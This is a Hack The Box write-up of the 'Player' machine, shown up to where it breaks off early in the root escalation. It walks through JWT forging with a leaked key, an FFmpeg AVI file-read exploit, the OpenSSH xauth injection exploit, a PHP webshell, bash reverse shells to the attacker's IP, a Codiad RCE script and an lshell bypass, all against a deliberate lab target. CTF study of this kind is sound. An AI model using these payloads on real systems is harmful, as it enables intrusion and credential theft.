---
title: HTB: Player
url: https://0xdf.gitlab.io/2020/01/18/htb-player.html
date: 2020-01-18T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, ctf, htb-player, nmap, vhosts, ssh, searchsploit, wfuzz, burp, jwt, codiad, bfac, ffmpeg, lshell, webshell, deserialization, php, lfi, escape
---

![Player](https://0xdfimages.gitlab.io/img/player-cover.png)

Player involved a lot of recon, and pulling together pieces to go down multiple different paths to user and root. I’ll start identifying and enumerating four different virtual hosts. Eventually I’ll find a backup file with PHP source on one, and use it to get access to a private area. From there, I can use a flaw in FFMPEG to leak videos that contain the text contents of various files on Player. I can use that information to get credentials where I can SSH, but only with a *very* limited shell. However, I can use an SSH exploit to get code execution that provides limited and partial file read, which leads to more credentials. Those credentials are good for a Codiad instance running on another of the virtual hosts, which allows me to get a shell as www-data. There’s a PHP script running as a cron as root that I can exploit either by overwriting a file include, or by writing serialized PHP data. In Beyond Root, I’ll look at two more altnerative paths, one jumping right to shell against Codiad, and the other bypassing lshell.

## Box Info

| Name | [Player](https://hackthebox.com/machines/player)  [Player](https://hackthebox.com/machines/player) [Play on HackTheBox](https://hackthebox.com/machines/player) |
| --- | --- |
| Release Date | [06 Jul 2019](https://twitter.com/hackthebox_eu/status/1147055350165757952) |
| Retire Date | 18 Jan 2020 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Player |
| Radar Graph | Radar chart for Player |
| First Blood User | 04:24:26[mprox mprox](https://app.hackthebox.com/users/16690) |
| First Blood Root | 04:22:13[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` shows HTTP on 80 and two SSH servers on TCP 22 and TCP 6686:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.145
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-08 01:13 EDT
Nmap scan report for 10.10.10.145
Host is up (0.036s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6686/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 9.46 seconds
root@kali# nmap -p 22,80,6686 -sV -sC -oA scans/nmap-scripts 10.10.10.145
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-08 01:15 EDT
Nmap scan report for 10.10.10.145
Host is up (0.033s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)
|   2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)
|   256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)
|_  256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 403 Forbidden
6686/tcp open  ssh     OpenSSH 7.2 (protocol 2.0)
Service Info: Host: player.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds

```

The hostname `player.htb` is good to know. I’ll add that to my `/etc/hosts` file:

```
10.10.10.145 player.htb

```

### SSH - TCP 22 and 6686

There typically isn’t a ton of enumeration to do on ssh, but because I see two different services running, I’ll take a quick look. I can manually reproduce the version results `nmap` returned:

```

root@kali# nc 10.10.10.145 22
SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.11
^C
root@kali# nc 10.10.10.145 6686
SSH-2.0-OpenSSH_7.2
^C

```

The `OpenSSH` version on port 22 looks like the standard Ubuntu Trusty (14.04) version, which is old. The 6686 version is close to the standard version for Xenial (16.04).

The `nmap` scan didn’t return a fingerprint for port 6686. I can check this manually as well:

```

root@kali# ssh-keyscan 10.10.10.145 | ssh-keygen -lf - 
# 10.10.10.145:22 SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.11
# 10.10.10.145:22 SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.11
# 10.10.10.145:22 SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.11
256 SHA256:WSyBHMRO+eahNIIWRpm6TVmnmK9ag3uVAMT1U+Q1zWM 10.10.10.145 (ECDSA)
2048 SHA256:35fJkzQ4vNSx10WBrjNV+b/N2V0B463/xNWI+HFQ3UM 10.10.10.145 (RSA)
256 SHA256:8rmrsyqW6LHgmTrVtFYDb+HfglaTm6iWUYZCxFUGg8E 10.10.10.145 (ED25519)
root@kali# ssh-keyscan -p 6686 10.10.10.145 | ssh-keygen -lf - 
write (10.10.10.145): Connection reset by peer
write (10.10.10.145): Connection reset by peer
# 10.10.10.145:6686 SSH-2.0-OpenSSH_7.2
2048 SHA256:x40/OBSv8gLgigbiVR3Jw+Tz4vWKxERysLbs6uAl/yQ [10.10.10.145]:6686 (RSA)

```

Something on 6686 doesn’t respond to the ED checks.

I did a `searchsploit` to see if any obvious vulnerabilities existed against the older version, but nothing looks useful to me yet:

```

root@kali# searchsploit OpenSSH 6.
---------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                  |  Path
                                                                | (/usr/share/exploitdb/)
---------------------------------------------------------------- ----------------------------------------
Novell Netware 6.5 - OpenSSH Remote Stack Overflow              | exploits/novell/dos/14866.txt
OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation            | exploits/linux/local/41173.c
OpenSSH 7.2p2 - Username Enumeration                            | exploits/linux/remote/40136.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                    | exploits/linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                          | exploits/linux/remote/45001.py
OpenSSH SCP Client - Write Arbitrary Files                      | exploits/multiple/remote/46516.py
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident             | exploits/linux/remote/26.sh
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool               | exploits/linux/remote/25.c
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack            | exploits/multiple/remote/3303.sh
---------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

The newer SSH has user enumeration and authenticated Command Injection:

```

root@kali# searchsploit OpenSSH 7.2
-------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                              |  Path
                                                                                            | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------- ----------------------------------------
OpenSSH 7.2 - Denial of Service                                                             | exploits/linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                     | exploits/multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                        | exploits/linux/remote/40136.py
OpenSSHd 7.2p2 - Username Enumeration                                                       | exploits/linux/remote/40113.txt
-------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

Don’t see anything useful there yet, but I’ll keep them in mind, since something is clearly going on with SSH.

### Website - TCP 80

#### Site

The site returns a 403 forbidden when accessed at `http://10.10.10.145` or at `http://player.htb`:

![1562585767783](https://0xdfimages.gitlab.io/img/1562585767783.png)

#### Virtual Hosts

Given that I know there’s a hostname, I’ll look for subdomains using `wfuzz`:

```

root@kali# wfuzz -c -u 'http://10.10.10.145' -H 'Host: FUZZ.player.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt --hc 403
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.145/
Total requests: 19983

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000019:  C=200     86 L      229 W         5243 Ch        "dev"
000067:  C=200     63 L      180 W         1470 Ch        "staging"
000070:  C=200    259 L      714 W         9513 Ch        "chat"
009543:  C=400     12 L       53 W          422 Ch        "#www"
010595:  C=400     12 L       53 W          422 Ch        "#mail"

Total time: 71.01510
Processed Requests: 19983
Filtered Requests: 19978
Requests/sec.: 281.3908

```

I’ll update my `/etc/hosts` file again:

```
10.10.10.145 player.htb dev.player.htb staging.player.htb chat.player.htb

```

### chat.player.htb

This site has a chat conversation about security vulnerabilities in the site:

![1562586419648](https://0xdfimages.gitlab.io/img/1562586419648.png)

Of note, there are sensitive files on staging, and source code exposed on the main domain.

### player.htb

#### gobuster

Given the chat about the source code being exposed on the main domain, I’ll give `gobuster` a run (it returns the same with the ip or `player.htb`):

```

root@kali# gobuster dir -u http://player.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o scans/gobuster-player-root -t 50                                           
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://player.htb
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/07/08 07:43:23 Starting gobuster
===============================================================
/launcher (Status: 301)
===============================================================
2019/07/08 07:44:36 Finished
===============================================================

```

#### /launcher

This page has a count-down until the product launches:

![1562586567220](https://0xdfimages.gitlab.io/img/1562586567220.png)

If I look at the source and get the url for that image of code (`http://player.htb/launcher/images/img_bg_1_gradient.jpg`) with the source code, I can view it completely:

![](https://0xdfimages.gitlab.io/img/img_bg_1_gradient.jpg.png)

This might be the source code leak, but I think there must be more. The page is making a call every second to `/launcher/dee8dc8a47256c64630d803a4c40786e.php`. The reply is always:

```

HTTP/1.1 200 OK
Date: Fri, 17 Jan 2020 01:58:55 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
Content-Length: 16
Connection: close
Content-Type: text/html

Not released yet

```

There’s also a form to submit an email address. I’ll enter a dummy email address, 0xdf@10.10.11, using my IP as the domain to see if it tries to contact me. I don’t see anything on `nc -lnvp 25`, but I see in Burp that the page I submit to, `/launcher/dee8dc8a47256c64630d803a4c40786c.php`, does set a cookie:

```

HTTP/1.1 302 Found
Date: Fri, 17 Jan 2020 01:58:57 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
Set-Cookie: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU; expires=Sun, 16-Feb-2020 01:58:57 GMT; Max-Age=2592000; path=/
Location: index.html
Content-Length: 0
Connection: close
Content-Type: text/html

```

That’s a JWT, and if I put it into [jwt.io](https://jwt.io/), it decodes to:

![1562601583329](https://0xdfimages.gitlab.io/img/1562601583329.png)

Without the secret, there’s not much I can do to change this cookie, nor would I know what to change it to. I will note that that `access_code` is the sha1sum of “welcome”:

```

root@kali# echo -n welcome | sha1sum 
c0b137fe2d792459f26ff763cce44574a5b5ab03  -

```

I could try to crack the secret in `john` or `hashcat`, but given the number of hints from `chat`, I’ll save that for now.

### dev.player.htb

The page presents a black login page:

![1562587289044](https://0xdfimages.gitlab.io/img/1562587289044.png)

It’s not clear what this is, but the more button gives some additional options:

![1562587312922](https://0xdfimages.gitlab.io/img/1562587312922.png)

In the page source, there’s a script at the bottom, `components/user/init.js`. Checking that out, I’ll see the Copyright message at the top:

```

/*
 *  Copyright (c) Codiad & Kent Safranski (codiad.com), distributed
 *  as-is and without warranty under the MIT License. See
 *  [root]/license.txt for more. This information must remain intact.
 */

```

[codiad.com](http://codiad.com/) has a link to “Try a Live Demo”. Clicking shows me a page with username and password, and a button to access demo. When I click access, I get the same login page:

![1562587490843](https://0xdfimages.gitlab.io/img/1562587490843.png)

I’ll definitely want to check this out if I find creds.

### staging.player.htb

The site looks like it’s down at the moment:

![1562595621520](https://0xdfimages.gitlab.io/img/1562595621520.png)

The “Product Updates” and “About PlayBuff” tabs both give this static page that refreshes every few seconds:

![1562595663852](https://0xdfimages.gitlab.io/img/1562595663852.png)

The “Contact Core Team” link goes to a form:

![1562595690033](https://0xdfimages.gitlab.io/img/1562595690033.png)

On submitting, it drops some php in a redirect to a crash page:

![1562595729559](https://0xdfimages.gitlab.io/img/1562595729559.png)

In Burp, I can grab the php array:

```

array(3) {
  [0]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(6)
    ["function"]=>
    string(1) "c"
    ["args"]=>
    array(1) {
      [0]=>
      &string(9) "Cleveland"
    }
  }
  [1]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(3)
    ["function"]=>
    string(1) "b"
    ["args"]=>
    array(1) {
      [0]=>
      &string(5) "Glenn"
    }
  }
  [2]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(11)
    ["function"]=>
    string(1) "a"
    ["args"]=>
    array(1) {
      [0]=>
      &string(5) "Peter"
    }
  }
}
Database connection failed.<html><br />Unknown variable user in /var/www/backup/service_config fatal error in /var/www/staging/fix.php

```

I’ve got some paths to where some files are on the file system. I can guess at this point that the structure looks something like this, with the three leaked file names:

```

/var
  /www
    /html
    /staging
      /contact.php
      /fix.php
    /dev
    /chat
    /backup
      /service_config

```

When I allow the redirect, I get an error page:

![1562595748807](https://0xdfimages.gitlab.io/img/1562595748807.png)

Interestingly, that’s actually a 200 response code from `501.php`.

## Access to PlayBuff Cloud

### Find Source

The chat mentioned source being available on the main site. [Backup File Artifact Checker](https://github.com/mazen160/bfac), or `bfac` is a good tool to check for artifacts or various tools that create temporary files. For example, on `dev`, it finds a `.gitignore` file:

```

root@kali# bfac --url http://dev.player.htb
----------------------------------------------------------------------
                 _____ _____ _____ _____
                | __  |   __|  _  |     |
                | __ -|   __|     |   --|
                |_____|__|  |__|__|_____|
           -:::Backup File Artifacts Checker:::-
                     Version: 1.4
  Advanced Backup-File Artifacts Testing for Web-Applications
Author: Mazin Ahmed | <mazin AT mazinahmed DOT net> | @mazen160
----------------------------------------------------------------------

[i] URL: http://dev.player.htb
[$] Discovered: -> {http://dev.player.htb/.gitignore} (Response-Code: 200 | Content-Length: 173)
[$] Discovered: -> {http://dev.player.htb/.} (Response-Code: 200 | Content-Length: 5243)

[i] Findings:
http://dev.player.htb/.gitignore (200) | (Content-Length: 173)
http://dev.player.htb/. (200) | (Content-Length: 5243)

[i] Finished performing scan.

```

I can see the `.gitignore` file:

```

root@kali# curl http://dev.player.htb/.gitignore
*~
*\#
*.swp
config.php
data/
workspace/
plugins/*
!plugins/README.md
themes/*
!themes/default/
!themes/README.md
.project
.buildpath
.settings/
.svn/
vendor/
composer.lock

```

I’ll also run it over various files I found on the main site. When I run it over the php file for the mail submission, it finds something:

```

root@kali# bfac --url http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php
----------------------------------------------------------------------
                 _____ _____ _____ _____
                | __  |   __|  _  |     |
                | __ -|   __|     |   --|
                |_____|__|  |__|__|_____|
           -:::Backup File Artifacts Checker:::-
                     Version: 1.4
  Advanced Backup-File Artifacts Testing for Web-Applications
Author: Mazin Ahmed | <mazin AT mazinahmed DOT net> | @mazen160
----------------------------------------------------------------------

[i] URL: http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php
[$] Discovered: -> {http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~} (Response-Code: 200 | Content-Length: 742)

[i] Findings:
http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~ (200) | (Content-Length: 742)

[i] Finished performing scan.

```

If I go to that url, I get what must be the source for `dee8dc8a47256c64630d803a4c40786c.php`.

### Source Analysis

I can look at the source now:

```

root@kali# curl 'http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~'
<?php
require 'vendor/autoload.php';

use \Firebase\JWT\JWT;

if(isset($_COOKIE["access"]))
{
        $key = '_S0_R@nd0m_P@ss_';
        $decoded = JWT::decode($_COOKIE["access"], base64_decode(strtr($key, '-_', '+/')), ['HS256']);
        if($decoded->access_code === "0E76658526655756207688271159624026011393")
        {
                header("Location: 7F2xxxxxxxxxxxxx/");
        }
        else
        {
                header("Location: index.html");
        }
}
else
{
        $token_payload = [
          'project' => 'PlayBuff',
          'access_code' => 'C0B137FE2D792459F26FF763CCE44574A5B5AB03'
        ];
        $key = '_S0_R@nd0m_P@ss_';
        $jwt = JWT::encode($token_payload, base64_decode(strtr($key, '-_', '+/')), 'HS256');
        $cookiename = 'access';
        setcookie('access',$jwt, time() + (86400 * 30), "/");
        header("Location: index.html");
}

?>

```

The source is pretty simple. If the cookie `access` is present, it decodes it using the JWT module and the key `_S0_R@nd0m_P@ss_`. If the access code is `0E76658526655756207688271159624026011393`, it redirects to `7F2xxxxxxxxxxxxx/`. Otherwise, it redirects to `index.html`.

If the cookie isn’t there, it creates the token using the welcome `access_code`, and sets it, redirecting to `index.html`.

### Forge Cookie

At first I tried to just visit `/7F2xxxxxxxxxxxxx/`, but the page doesn’t exist. I suspect the path is different in the running file. So it’s time to make my own JWT. I’ll go over to [jwt.io](https://jwt.io/). This site is a bit tricky to work with. If you just paste in the cookie, and then put in the key, it will update the cookie to be signed by that key. So I need to first put in the password and the original cookie, and make sure it stays that way and says valid. Once I have that, I’ll change the `access_code` and then copy the new cookie.

With the key in place and “secret base64 encoded” checked, I can get back the original cookie (I have no idea why it needs to be marked as base64 when it is clearly not, but that works):

![1562602779419](https://0xdfimages.gitlab.io/img/1562602779419.png)

Now I can update the `access_code` to the one in the source, and I get a new cookie: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE`.

### Access

I’ll use my cookie manager to change out the cookie, and enter anything for “email”, hit submit, and I ended up at `http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/`:

![1562602971976](https://0xdfimages.gitlab.io/img/1562602971976.png)

## user.txt

### Enumeration

The site is an upload site. When I upload something via the form, it is sent via HTTP POST to `/upload.php`. The response is a 200 with an HTTP header to redirect instantly which contains a token:

```

refresh: 0;url=index.php/?token=1622989229

```

The token changes each time, and when a token is given, there’s a download link on the page:

![1562615711507](https://0xdfimages.gitlab.io/img/1562615711507.png)

If I upload text files or images or anything else, the download link either 404s, or it returns a 0 byte file. I found a dummy mpg to upload, and it returned an avi: `http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/uploads/890756789.avi`

### ffmpeg AVI Exploit

Given that the page is creating `.avi` files from what I upload, some googling led me to [this talk from Blackhat 2016](https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf). [This article](https://hydrasky.com/network-security/exploiting-ssrf-in-video-converters/) is a really good explanation of how the exploit works. The basics is that there’s a flaw in FFMEG that allows me to submit a malicious `.avi` file and get back a video of the text of the file.

I found [this POC script](https://github.com/cujanovic/SSRF-Testing/blob/master/ffmpeg/gen_avi.py) on Github. For example, I’ll grab the `/etc/lsb-release` file. First create the `.avi`:

```

root@kali# python gen_avi.py file:///etc/lsb-release etc_lsb-release.avi

```

Now I’ll upload that `.avi`, and when I download the result, it is a video with the contents of `/etc/lsb-release` from Player:

![image-20200116214725682](https://0xdfimages.gitlab.io/img/image-20200116214725682.png)

### Enumeration

Thinking back to the error messages earlier on `staging`, I’ll try to grab those files:
- `/var/www/backup/service_config`
- `/var/www/staging/fix.php`

I’m not able to get `fix.php`, but I do get `service_config`:

![1562654140484](https://0xdfimages.gitlab.io/img/1562654140484.png)

### SSH lshell

I’ll try those creds for SSH. Port 22 doesn’t do much, but I can use those creds on the second ssh port (6686), username `telegen`, password `d-bC|jC!2uepS/w`:

```

root@kali# ssh -p 6686 telegen@10.10.10.145
telegen@10.10.10.145's password: 
Last login: Tue Apr 30 18:40:13 2019 from 192.168.0.104
Environment:
  USER=telegen
  LOGNAME=telegen
  HOME=/home/telegen
  PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
  MAIL=/var/mail/telegen
  SHELL=/usr/bin/lshell
  SSH_CLIENT=10.10.14.8 43766 6686
  SSH_CONNECTION=10.10.14.8 43766 10.10.10.145 6686
  SSH_TTY=/dev/pts/0
  TERM=screen
========= PlayBuff ==========
Welcome to Staging Environment

telegen:~$

```

However, I can run almost nothing:

```

telegen:~$ id
*** forbidden command: id
telegen:~$ whoami
*** forbidden command: whoami
telegen:~$ help
  clear  exit  help  history  lpath  lsudo
telegen:~$ lpath
Allowed:
 /home/telegen
telegen:~$ lsudo
Allowed sudo commands:

```

### SSH Exploit

Back when I enumerated the ssh ports, there was a vulnerabity I didn’t understand the value of:

```

OpenSSH 7.2p1 - (Authenticated) xauth Command Injection

```

Why would I need command injection when authenticated? Now I see.

```

root@kali# python 39569.py 10.10.10.145 6686 telegen 'd-bC|jC!2uepS/w'
INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@10.10.10.145:6686
INFO:__main__:connected!
INFO:__main__:
Available commands:
    .info
    .readfile <path>
    .writefile <path> <data>
    .exit .quit
    <any xauth command or type help>

#>

```

This exploit shell can do very little. It has some file write capability, but I didn’t have much luck with that. It can read files, but only up to the first whitespace on each line. Luckily for me, `user.txt` doesn’t have any whitespace :)

```

#> .readfile user.txt
DEBUG:__main__:auth_cookie: 'xxxx\nsource user.txt\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:30e47abe************************

```

## Shell as www-data

### Read fix.php

With the SSH exploit as telegen, I can now read parts of the other log file, `/var/www/staging/fix.php`:

```

root@kali# python 39569.py 10.10.10.145 6686 telegen 'd-bC|jC!2uepS/w'
INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@10.10.10.145:6686
INFO:__main__:connected!
INFO:__main__:
Available commands:
    .info
    .readfile <path>
    .writefile <path> <data>
    .exit .quit
    <any xauth command or type help>

#> .readfile /var/www/staging/fix.php
DEBUG:__main__:auth_cookie: 'xxxx\nsource /var/www/staging/fix.php\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:<?php
class
protected
protected
protected
public
return
}
public
if($result
static::passed($test_name);
}
static::failed($test_name);
}
}
public
if($result
static::failed($test_name);
}
static::passed($test_name);
}
}
public
if(!$username){
$username
$password
}
//modified
//for
//fix
//peter
//CQXpm\z)G5D#%S$y=
}
public
if($result
static::passed($test_name);
}
static::failed($test_name);
}
}
public
echo
echo
echo
}
private
echo
static::$failed++;
}
private
static::character(".");
static::$passed++;
}
private
echo
static::$last_echoed
}
private
if(static::$last_echoed
echo
static::$last_echoed
}
}

```

Because I only get up to the first whitespace on each line, it looks weird. But there’s a useful comment:

```

//modified
//for
//fix
//peter
//CQXpm\z)G5D#%S$y=

```

The string `CQXpm\z)G5D#%S$y=` is interesting.

It turns out those creds work for a codiad login on `dev.player.htb`:

![1562690003006](https://0xdfimages.gitlab.io/img/1562690003006.png)

### Shell through Codiad

There are two ways to get a shell through Codiad that I’m aware of.

#### Write Webshell

When the page first loads after login, there’s a message that the path doesn’t exist:

![image-20200116221653659](https://0xdfimages.gitlab.io/img/image-20200116221653659.png)

I can add a new project by hitting the plus sigh in the Projects section:

![image-20200116221726805](https://0xdfimages.gitlab.io/img/image-20200116221726805.png)

I’m asked for a name and a path. I figured I’d like access to the entire file system, so I enter a name of Root and a path of `/`. On hitting Create Project, I get an error:

![image-20200116221839010](https://0xdfimages.gitlab.io/img/image-20200116221839010.png)

I’ll try `/var/www/demo` then, and it works. I can see what looks like the contents of the directory in the Explore window:

![image-20200116221942402](https://0xdfimages.gitlab.io/img/image-20200116221942402.png)

I’m not exactly sure what virtual host `/var/www/demo` corresponds to, but I’m guessing `dev`. To test, I’ll see if I can get `AUTHORS.txt` at http://dev.player.htb/AUTHORS.txt, and it works:

```

root@kali# curl http://dev.player.htb/AUTHORS.txt
Authors Ordered By First Contribution
--------------------------------------------------

Kent Safranski - @fluidbyte <kent@fluidbyte.net>
Tim Holum - @tholum
Gaurab Paul - @lorefnon
Shawn A - @tablatronix
Florent Galland - @Flolagale
Luc Verdier - @Verdier
Danny Morabito - @newsocialifecom <staff@newsocialife.com>
Alexander D - @daeks
Jean-Philippe Zolesio - @holblin

and all the other contributors - Thanks!

```

Now I can just right click on `demo`, and select New File, and add a `cmd.php`. I’ll write my standard webshell:

```

<?php system($_REQUEST["0xdf"]); ?>

```

I’ll save the file, and then test it:

```

root@kali# curl http://dev.player.htb/cmd.php?0xdf=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

To get a shell, I’ll visit `http://dev.player.htb/cmd.php?0xdf=bash -c 'bash -i >%26 /dev/tcp/10.10.14.8/443 0>%261'` with `nc` listening on 443:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.145.
Ncat: Connection from 10.10.10.145:46678.
bash: cannot set terminal process group (2206): Inappropriate ioctl for device
bash: no job control in this shell
www-data@player:/var/www/demo$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

#### Codiad Exploit

There’s a public authenticated exploit to get a shell through codiad, and [this repo](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit) gives a nice POC. I’ll run the script and follow its instructions:

Terminal 1:

```

root@kali# ./codiad_exp.py http://dev.player.htb/ peter 'CQXpm\z)G5D#%S$y=' 10.10.14.8 443 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.10.14.8/444 0>&1 2>&1"' | nc -lnvp 443
nc -lnvp 444
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"peter"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"PlayBuff","path":"playbuff"}}
[+] Writeable Path : playbuff
[+] Sending payload...

```

Terminal 2:

```

root@kali# echo 'bash -c "bash -i >/dev/tcp/10.10.14.8/444 0>&1 2>&1"' | nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.145.
Ncat: Connection from 10.10.10.145:42534.

```

Terminal 3:

```

root@kali# nc -lnvp 444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::444
Ncat: Listening on 0.0.0.0:444
Ncat: Connection from 10.10.10.145.
Ncat: Connection from 10.10.10.145:49500.
bash: cannot set terminal process group (1178): Inappropriate ioctl for device
bash: no job control in this shell
www-data@player:/var/www/demo/components/filemanager$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

[![shell](https://0xdfimages.gitlab.io/img/player-shell.gif)*Click for full size image*](https://0xdfimages.gitlab.io/img/player-shell.gif)

## Shell as telegen

I had creds for telegen and was able to connect over SSH, but couldn’t get anything to run. I can see in `/etc/passwd` that telegen’s shell is set to `lshell`:

```

www-data@player:/$ grep telegen /etc/passwd
telegen:x:1000:1000:telegen,,,:/home/telegen:/usr/bin/lshell

```

[lshell](https://github.com/ghantoos/lshell) is a shell that allows the creator to limit what commands can be run.

However, I can use `su` with the `-s` arg to specify the shell I want to run:

```

www-data@player:/$ su -s /bin/bash telegen
Password: 
telegen@player:/$

```

Now I have a full `bash` shell. I can also grab `user.txt` if I hadn’t already before.

## Priv: www-data or telegen -> root

### Enumeration

After looking through the box, running LinEnum, etc, I pull `pspy` up to target and ran it. I noticed the following being run each minute as root:

```

2019/07/09 12:54:01 CMD: UID=0    PID=6291   | CRON                 
2019/07/09 12:54:01 CMD: UID=0    PID=6293   | /usr/bin/php /var/lib/playbuff/buff.php 
2019/07/09 12:54:01 CMD: UID=0    PID=6292   | /bin/sh -c /usr/bin/php /var/lib/playbuff/buff.php > /var/lib/playbuff/error.log 

```

`buff.php` was owned by root:

```

www-data@player:/dev/shm$ ls -l /var/lib/playbuff/buff.php                           
-rwx---r-- 1 root root 878 Mar 24 17:19 /var/lib/playbuff/buff.php

```

It appears to be doing some kind of processing log update:

```

<?php
include("/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php");
class playBuff
{
        public $logFile="/var/log/playbuff/logs.txt";
        public $logData="Updated";

        public function __wakeup()
        {
                file_put_contents(__DIR__."/".$this->logFile,$this->logData);
        }
}
$buff = new playBuff();
$serialbuff = serialize($buff);
$data = file_get_contents("/var/lib/playbuff/merge.log");
if(unserialize($data))
{
        $update = file_get_contents("/var/lib/playbuff/logs.txt");
        $query = mysqli_query($conn, "update stats set status='$update' where id=1");
        if($query)
        {
                echo 'Update Success with serialized logs!';
        }
}
else
{
        file_put_contents("/var/lib/playbuff/merge.log","no issues yet");
        $update = file_get_contents("/var/lib/playbuff/logs.txt");
        $query = mysqli_query($conn, "update stats set status='$update' where id=1");
        if($query)
        {
                echo 'Update Success!';
        }
}
?>

```

Two things jump out as targets of exploitation:
- There is an include on `/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php`.
- The contents of `/var/lib/playbuff/merge.log` are deserialized.

### Shell as root

#### Easy Path - Write Include File

I examined the included file, and it’s owned by www-data, one of the users I can have a shell as:

